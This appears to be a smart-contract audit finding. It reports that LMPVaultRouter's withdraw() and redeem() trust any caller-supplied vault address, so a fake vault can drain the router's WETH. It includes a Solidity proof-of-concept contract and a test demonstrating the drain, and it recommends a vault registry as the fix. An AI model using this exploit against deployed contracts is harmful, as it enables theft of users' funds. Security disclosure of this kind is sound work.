# LMPVaultRouter can be drained of WETH tokens.
## Summary
`withdraw()` and `redeem()` functions send WETH to a user-controlled address after calling withdraw or redeem function of a vault which is a user-controlled contract. The user might make a fake vault and pass true to `unwrapWETH` to gain all the WETH deposited in the router.

## Vulnerability Detail
There is no checking if the vault address provided is a vault or a fake., which leads to loss of WETH.

## Impact
Router is drained of WETH.

## PoC
```solidity
contract hackit {
    function withdraw(uint a, address b, address c) public returns(uint256){
        return 22;
    }

    function redeem(uint a, address b, address c) public returns(uint256){
        return 44;
    }
}

function testMineFirst() public{
       
        hackit h=new hackit();

        assertEq(address(0x111).balance,0);

        deal(WETH_MAINNET,address(lmpVaultRouter),10e18);
        lmpVaultRouter.redeem(ILMPVault(address(h)),address(0x111),33,33,true);

        assertEq(address(0x111).balance,10e18);

        deal(WETH_MAINNET,address(lmpVaultRouter),10e18);
        lmpVaultRouter.withdraw(ILMPVault(address(h)),address(0x111),33,33,true);
       
        assertEq(address(0x111).balance,20e18);
    }
```
Paste this contract and test in LMPVaultRouter.t.sol for testing the exploit.
## Tool used

Manual Review

## Recommendation
Introduce a way to identify the vault such a mapping vault=>bool.
